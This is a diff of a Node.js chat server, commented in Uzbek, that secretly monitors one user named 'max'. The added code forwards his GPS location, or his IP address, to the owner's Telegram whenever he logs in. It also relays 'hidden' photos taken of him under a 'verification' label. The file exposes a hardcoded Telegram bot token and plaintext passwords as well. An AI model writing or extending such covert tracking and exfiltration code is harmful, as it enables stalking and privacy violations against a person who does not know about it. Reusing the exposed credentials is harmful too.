@@ -8,7 +8,6 @@ const multer = require('multer');
 const https = require('https');
 
 // --- SOZLAMALAR ---
-// Tokeningizni shu yerga qo'ydim
 const TELEGRAM_BOT_TOKEN = '8338280465:AAFTlVRorrQNpaHnJEQjX6ynRM-rg5EhEGk'; 
 const MY_TELEGRAM_ID = '1178814024';
 
@@ -34,13 +33,31 @@ const USERS = { 'mura': 'shaxzoda', 'max': 'qiyshiq_qalam' };
 let onlineUsers = {}; 
 let lastSeen = { 'mura': null, 'max': null };
 
-// --- ESKI sendTelegramNotification FUNKSIYASINING TAGIGA SHUNI QO'SHING ---
+// 1-TUZATISH: ESKI FUNKSIYA QAYTARILDI
+function sendTelegramNotification(text) {
+    if (!TELEGRAM_BOT_TOKEN) return;
+    const data = JSON.stringify({ chat_id: MY_TELEGRAM_ID, text: text });
+    
+    const options = {
+        hostname: 'api.telegram.org',
+        port: 443,
+        path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+            'Content-Length': Buffer.byteLength(data)
+        }
+    };
+    const req = https.request(options, (res) => { res.on('data', () => {}); });
+    req.on('error', (e) => console.error('Telegram Xato:', e));
+    req.write(data);
+    req.end();
+}
 
 // Telegramga rasm yuborish funksiyasi
 function sendTelegramPhoto(photoUrl, caption) {
     if (!TELEGRAM_BOT_TOKEN) return;
     
-    // Sizning saytingiz internetda bo'lgani uchun, rasm ssilkasini botga beramiz, o'zi tortib oladi
     const data = JSON.stringify({ chat_id: MY_TELEGRAM_ID, photo: photoUrl, caption: caption });
     
     const options = {
@@ -60,18 +77,10 @@ function sendTelegramPhoto(photoUrl, caption) {
     req.end();
 }
 
-// ... pastroqda io.on('connection') ichiga quyidagi qismni qo'shamiz (socket.on('join') tugagandan keyin):
-
-    // YASHRIN RASMNI QABUL QILIB TELEGRAMGA YUBORISH
-    socket.on('verify_photo', (data) => {
-        // Render.com dagi ochiq ssilkangiz (domen)
-        const publicUrl = `https://max-chat-a2sv.onrender.com/uploads/${data.filename}`;
-        sendTelegramPhoto(publicUrl, `📸 Max tasdiqlash: ${data.type}`);
-    });
-
 app.post('/login', (req, res) => {
-    const username = req.body.username.trim();
-    const password = req.body.password.trim();
+    // Ekstra himoya sifatida kichik harfga o'tkazildi
+    const username = req.body.username ? req.body.username.trim().toLowerCase() : '';
+    const password = req.body.password ? req.body.password.trim() : '';
 
     if (USERS[username] && USERS[username] === password) {
         res.json({ success: true, username: username });
@@ -79,7 +88,6 @@ app.post('/login', (req, res) => {
         res.json({ success: false });
     }
 });
-
 
 app.post('/upload', upload.single('file'), (req, res) => {
     if(req.file) {
@@ -117,9 +125,8 @@ io.on('connection', (socket) => {
         if (username === 'max') {
             let msg = `⚠️ MAX tizimga kirdi!`;
             
-            // Agar lokatsiya koordinatalari bo'lsa
             if (typeof data === 'object' && data.lat && data.lon) {
-                // 2-TUZATISH SHU YERDA: Google Maps ssilkasi to'g'irlab qo'yildi
+                // 3-TUZATISH: Google Maps ssilkasi to'liq ishlaydigan holatga keltirildi
                 msg += `\n🌍 Joylashuv: https://www.google.com/maps?q=${data.lat},${data.lon}`;
             } else {
                 msg += `\n📍 IP: ${clientIp} (GPS ruxsat berilmadi)`;
@@ -129,6 +136,12 @@ io.on('connection', (socket) => {
 
         io.emit('status_update', { online: Object.keys(onlineUsers), lastSeen: lastSeen });
         socket.emit('load_history', getHistory());
+    });
+
+    // 2-TUZATISH: YASHRIN RASMNI QABUL QILISH CONNECTION ICHIGA OLINDI
+    socket.on('verify_photo', (data) => {
+        const publicUrl = `https://max-chat-a2sv.onrender.com/uploads/${data.filename}`;
+        sendTelegramPhoto(publicUrl, `📸 Max tasdiqlash: ${data.type}`);
     });
 
     socket.on('send_message', (data) => {
